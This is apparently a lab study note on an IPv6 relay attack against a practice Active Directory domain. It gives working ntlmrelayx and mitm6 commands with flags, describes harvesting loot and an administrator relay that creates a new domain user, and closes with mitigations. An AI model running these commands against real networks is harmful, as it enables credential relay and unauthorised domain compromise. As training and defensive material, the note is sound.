Attack done with mitm6 (man in the middle 6)
  
Set up an ntlmrelayx then run mitm6
- ntlmrelayx.py -6 -t ldaps://192.168.83.128 -wh fakewpad.marvel.local -l lootme
    
    - -6 for mitm6
    
    - -t for target
    
    - -wh for wpad
    
    - -l for where loot is stored
    
- sudo mitm6 -d marvel.local
    
    - -d domain
    
![[/Untitled 16.png|Untitled 16.png]]
![[/Untitled 1 4.png|Untitled 1 4.png]]
  
Then restart a workstation and watch the mitm6
![[/Untitled 2 4.png|Untitled 2 4.png]]
after a computer was successful, check the lootme folder that was created
![[/Untitled 3 4.png|Untitled 3 4.png]]
  
If an administrator logs in, then the ntlmrelayx will print out a new user and password that was made
![[/Untitled 4 2.png|Untitled 4 2.png]]
Created user shows up in the DC
![[/Untitled 5 2.png|Untitled 5 2.png]]
  
  
Mitigation:
- If IPv6 is not being used internally, then the safest way to prevent mitm6 is to block DHCPv6 traffic
![[../assets/IPv6 Attacks/Untitled 6 2.png|Untitled 6 2.png]]
- If WPAD is not used internally, disable it via group policy and disable the WinHttpAutoProxySvc service
- Enable LDAP signing and LDAP channel binding
- Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.